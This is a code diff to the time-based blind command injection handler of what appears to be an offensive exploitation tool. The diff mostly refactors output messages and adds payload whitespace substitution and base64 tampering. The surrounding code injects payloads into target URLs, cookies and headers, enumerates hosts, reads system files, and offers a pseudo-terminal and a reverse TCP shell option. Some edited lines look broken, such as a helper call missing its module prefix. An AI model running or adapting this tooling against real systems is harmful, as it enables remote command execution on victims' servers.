@@ -80,8 +80,9 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
   injection_type = "Blind Command Injection"
   technique = "time-based injection technique"
 
-  if menu.options.verbose:
-    print settings.INFO_SIGN + "Testing the " + technique + "... "
+  if settings.VERBOSITY_LEVEL >= 1:
+    info_msg = "Testing the " + technique + "... "
+    print settings.print_info_msg(info_msg)
 
   # Check if defined "--maxlen" option.
   if menu.options.maxlen:
@@ -89,11 +90,12 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
     
   # Check if defined "--url-reload" option.
   if menu.options.url_reload == True:
-    print Fore.YELLOW + settings.WARNING_SIGN + "The '--url-reload' option is not available in " + technique + "." + Style.RESET_ALL
-  
+    warn_msg = "The '--url-reload' option is not available in " + technique + "."
+    print settings.print_warning_msg(warn_msg)
+
+  whitespace = checks.check_whitespaces()
   # Calculate all possible combinations
   total = (len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES) - len(settings.JUNK_COMBINATION))
-
   for prefix in settings.PREFIXES:
     for suffix in settings.SUFFIXES:
       for separator in settings.SEPARATORS:
@@ -102,6 +104,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
         if settings.LOAD_SESSION and session_handler.notification(url, technique):
           cmd = shell = ""
           url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, delay, how_long, output_length, is_vulnerable = session_handler.injection_point_exportation(url, http_request_method)
+          checks.check_for_stored_tamper(payload)
           settings.FOUND_HOW_LONG = how_long
           settings.FOUND_DIFF = how_long - delay
 
@@ -137,12 +140,17 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
               payload = parameters.prefixes(payload, prefix)
               payload = parameters.suffixes(payload, suffix)
 
-              if menu.options.base64:
-                payload = base64.b64encode(payload)
+              # Whitespace fixation
+              payload = re.sub(" ", whitespace, payload)
+
+              if settings.TAMPER_SCRIPTS['base64encode']:
+                from src.core.tamper import base64encode
+                payload = base64encode.encode(payload)
 
               # Check if defined "--verbose" option.
-              if menu.options.verbose:
-                print Fore.GREY + settings.PAYLOAD_SIGN + payload.replace("\n", "\\n") + Style.RESET_ALL
+              if settings.VERBOSITY_LEVEL >= 1:
+                payload_msg = payload.replace("\n", "\\n")
+                print settings.print_payload(payload_msg)
 
               # Cookie Injection
               if settings.COOKIE_INJECTION == True:
@@ -184,7 +192,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
               float_percent = "{0:.1f}".format(round(((num_of_chars*100)/(total * 1.0)),2))
 
               if percent == 100 and no_result == True:
-                if not menu.options.verbose:
+                if not settings.VERBOSITY_LEVEL >= 1:
                   percent = Fore.RED + "FAILED" + Style.RESET_ALL
                 else:
                   percent = ""
@@ -215,9 +223,9 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                   # Identified false positive warning message.
                   if false_positive_warning and again_warning:
                     again_warning = False
-                    warning_msg = settings.WARNING_SIGN + "Unexpected time delays have been identified due to unstable "
-                    warning_msg += "requests. This behavior which may lead to false-positive results."
-                    sys.stdout.write("\r" + Fore.YELLOW + warning_msg + Style.RESET_ALL)
+                    warn_msg = "Unexpected time delays have been identified due to unstable "
+                    warn_msg += "requests. This behavior which may lead to false-positive results."
+                    sys.stdout.write("\r" +print_warning_msg(warn_msg))
                     print ""
 
                   # Check if false positive fixation is True.
@@ -235,10 +243,10 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                       else:
                         cmd = "powershell.exe -InputFormat none write (" + str(randv1) + " + " + str(randv2) + ")"
                     else:
-                      cmd = "(" + str(randv1) + " + " + str(randv2) + ")"
+                      cmd = "expr " + str(randv1) + " + " + str(randv2) + ""
 
                     # Check for false positive resutls
-                    how_long, output = tb_injector.false_positive_check(separator, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response)
+                    how_long, output = tb_injector.false_positive_check(separator, TAG, cmd, whitespace, prefix, suffix, delay, http_request_method, url, vuln_parameter, randvcalc, alter_shell, how_long, url_time_response)
 
                     if (url_time_response == 0 and (how_long - delay) >= 0) or \
                        (url_time_response != 0 and (how_long - delay) == 0 and (how_long == delay)) or \
@@ -247,7 +255,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                       if str(output) == str(randvcalc) and len(TAG) == output_length:
                         is_vulnerable = True
                         how_long_statistic = 0
-                        if not menu.options.verbose:
+                        if not settings.VERBOSITY_LEVEL >= 1:
                           percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
                         else:
                           percent = ""
@@ -255,19 +263,22 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                       break
                   # False positive
                   else:
-                    if not menu.options.verbose:
+                    if not settings.VERBOSITY_LEVEL >= 1:
                       percent = str(float_percent)+ "%"
-                      sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
+                      info_msg = "Testing the " + technique + "... " +  "[ " + percent + " ]"
+                      sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                       sys.stdout.flush()
                     continue    
                 else:
-                  if not menu.options.verbose:
+                  if not settings.VERBOSITY_LEVEL >= 1:
                     percent = str(float_percent)+ "%"
-                    sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
+                    info_msg = "Testing the " + technique + "... " +  "[ " + percent + " ]"
+                    sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                     sys.stdout.flush()
                   continue
-              if not menu.options.verbose:
-                sys.stdout.write("\r" + settings.INFO_SIGN + "Testing the " + technique + "... " +  "[ " + percent + " ]")
+              if not settings.VERBOSITY_LEVEL >= 1:
+                info_msg = "Testing the " + technique + "... " +  "[ " + percent + " ]"
+                sys.stdout.write("\r" + settings.print_info_msg(info_msg))
                 sys.stdout.flush()
 
             except KeyboardInterrupt: 
@@ -296,9 +307,9 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
               is_vulnerable = False
 
             if settings.COOKIE_INJECTION == True: 
-              header_name = " Cookie"
+              header_name = " cookie"
               found_vuln_parameter = vuln_parameter
-              the_type = " HTTP header"
+              the_type = " parameter"
 
             elif settings.USER_AGENT_INJECTION == True: 
               header_name = " User-Agent"
@@ -330,7 +341,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
             if export_injection_info == False:
               export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)
             if vp_flag == True:
-              vp_flag = logs.add_parameter(vp_flag, filename, http_request_method, vuln_parameter, payload)
+              vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)
             logs.update_payload(filename, counter, payload) 
             counter = counter + 1
 
@@ -338,7 +349,10 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
               print ""
 
             # Print the findings to terminal.
-            print Style.BRIGHT + "(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
+            success_msg = "The (" + http_request_method + ")" 
+            success_msg += found_vuln_parameter + header_name
+            success_msg += the_type + " is vulnerable to " + injection_type + "."
+            print settings.print_success_msg(success_msg)
             print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
             print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
             print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload.replace("\n", "\\n")) + Style.RESET_ALL
@@ -354,10 +368,11 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
             # Check for any enumeration options.
             if settings.ENUMERATION_DONE == True:
               while True:
-                enumerate_again = raw_input("\n" + settings.QUESTION_SIGN + "Do you want to enumerate again? [Y/n/q] > ").lower()
+                question_msg = "Do you want to enumerate again? [Y/n/q] > "
+                enumerate_again = raw_input("\n" + settings.print_question_msg(question_msg)).lower()
                 if enumerate_again in settings.CHOICE_YES:
-                  tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
-                  print  ""
+                  tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+                  print ""
                   break
                 elif enumerate_again in settings.CHOICE_NO: 
                   new_line = True
@@ -367,19 +382,22 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 else:
                   if enumerate_again == "":
                     enumerate_again = "enter"
-                  print Back.RED + settings.ERROR_SIGN + "'" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL + "\n"
+                  err_msg = "'" + enumerate_again + "' is not a valid answer."  
+                  print settings.print_error_msg(err_msg) + "\n"
                   pass
             else:
               if menu.enumeration_options():
-                tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+                tb_enumeration.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                 print ""
 
             # Check for any system file access options.
             if settings.FILE_ACCESS_DONE == True:
+              print ""
               while True:
-                file_access_again = raw_input(settings.QUESTION_SIGN + "Do you want to access files again? [Y/n/q] > ").lower()
+                question_msg = "Do you want to access files again? [Y/n/q] > "
+                file_access_again = raw_input(settings.print_question_msg(question_msg)).lower()
                 if file_access_again in settings.CHOICE_YES:
-                  tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+                  tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                   break
                 elif file_access_again in settings.CHOICE_NO: 
                   if not new_line:
@@ -390,17 +408,18 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                 else:
                   if file_access_again == "":
                     file_access_again = "enter"
-                  print Back.RED + settings.ERROR_SIGN + "'" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL + "\n"
+                  err_msg = "'" + file_access_again  + "' is not a valid answer."  
+                  print settings.print_error_msg(err_msg) + "\n"
                   pass
             else:
               # if not menu.enumeration_options() and not menu.options.os_cmd:
               #   print ""
-              tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+              tb_file_access.do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
 
             # Check if defined single cmd.
             if menu.options.os_cmd:
               cmd = menu.options.os_cmd
-              check_how_long, output = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+              check_how_long, output = tb_enumeration.single_os_cmd_exec(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
               # Export injection result
               tb_injector.export_injection_results(cmd, separator, output, check_how_long)
               sys.exit(0)
@@ -414,7 +433,8 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
             while True:
               if go_back == True:
                 break 
-              gotshell = raw_input(settings.QUESTION_SIGN + "Do you want a Pseudo-Terminal? [Y/n/q] > ").lower()
+              question_msg = "Do you want a Pseudo-Terminal? [Y/n/q] > "  
+              gotshell = raw_input(settings.print_question_msg(question_msg)).lower()
               if gotshell in settings.CHOICE_YES:
                 print ""
                 print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
@@ -446,7 +466,8 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                         go_back = True
                         break
                       elif os_shell_option == "os_shell": 
-                          print Fore.YELLOW + settings.WARNING_SIGN + "You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
+                          warn_msg = "You are already into an 'os_shell' mode."
+                          print settings.print_warning_msg(warn_msg)+ "\n"
                       elif os_shell_option == "reverse_tcp":
                         settings.REVERSE_TCP = True
                         # Set up LHOST / LPORT for The reverse TCP connection.
@@ -469,14 +490,15 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                           # Command execution results.
                           from src.core.injections.results_based.techniques.classic import cb_injector
                           separator = checks.time_based_separators(separator, http_request_method)
-                          whitespace = settings.WHITESPACES[0]
+                          whitespace = urllib.quote(settings.WHITESPACE[0])
                           response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
                           # Evaluate injection results.
-                          shell = cb_injector.injection_results(response, TAG)
+                          shell = cb_injector.injection_results(response, TAG, cmd)
                           # Export injection result
-                          if menu.options.verbose:
+                          if settings.VERBOSITY_LEVEL >= 1:
                             print ""
-                          print Back.RED + settings.ERROR_SIGN + "The reverse TCP connection has been failed!" + Style.RESET_ALL
+                          err_msg = "The reverse TCP connection has been failed!"
+                          print settings.print_critical_msg(err_msg)
                       else:
                         pass
                       
@@ -485,7 +507,7 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
                       if menu.options.ignore_session or \
                          session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
                         # The main command injection exploitation.
-                        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
+                        check_how_long, output = tb_injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, delay, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response)
                         # Export injection result
                         tb_injector.export_injection_results(cmd, separator, output, check_how_long)
                         if not menu.options.ignore_session :
@@ -516,7 +538,8 @@ def tb_injection_handler(url, delay, filename, http_request_method, url_time_res
               else:
                 if gotshell == "":
                   gotshell = "enter"
-                print Back.RED + settings.ERROR_SIGN + "'" + gotshell + "' is not a valid answer." + Style.RESET_ALL + "\n"
+                err_msg = "'" + gotshell + "' is not a valid answer."
+                print settings.print_error_msg(err_msg) + "\n"
                 pass
               #break
           
@@ -533,13 +556,20 @@ The exploitation function.
 (call the injection handler)
 """
 def exploitation(url, delay, filename, http_request_method, url_time_response):
+  # Check if attack is based on time delays.
+  if not settings.TIME_BASED_ATTACK :
+    settings.TIME_BASED_ATTACK = True
   if url_time_response >= settings.SLOW_TARGET_RESPONSE:
-    print Fore.YELLOW + settings.WARNING_SIGN + "It is highly recommended, due to serious response delays, to skip the time-based (blind) technique and to continue with the file-based (semiblind) technique." + Style.RESET_ALL 
+    warn_msg = "It is highly recommended, due to serious response delays, "
+    warn_msg += "to skip the time-based (blind) technique and to continue "
+    warn_msg += "with the file-based (semiblind) technique."
+    print settings.print_warning_msg(warn_msg)
     go_back = False
     while True:
       if go_back == True:
         return False
-      proceed_option = raw_input(settings.QUESTION_SIGN + "How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > ").lower()
+      question_msg = "How do you want to proceed? [(C)ontinue/(s)kip/(q)uit] > "
+      proceed_option = raw_input(settings.print_question_msg(question_msg)).lower()
       if proceed_option.lower() in settings.CHOICE_PROCEED :
         if proceed_option.lower() == "s":
           from src.core.injections.semiblind.techniques.file_based import fb_handler
@@ -552,9 +582,11 @@ def exploitation(url, delay, filename, http_request_method, url_time_response):
       else:
         if proceed_option == "":
           proceed_option = "enter"
-        print Back.RED + settings.ERROR_SIGN + "'" + proceed_option + "' is not a valid answer." + Style.RESET_ALL + "\n"
+        err_msg = "'" + proceed_option + "' is not a valid answer."
+        print settings.print_error_msg(err_msg) + "\n"
         pass
   else:
     if tb_injection_handler(url, delay, filename, http_request_method, url_time_response) == False:
+      settings.TIME_BASED_ATTACK = False
       return False
 #eof
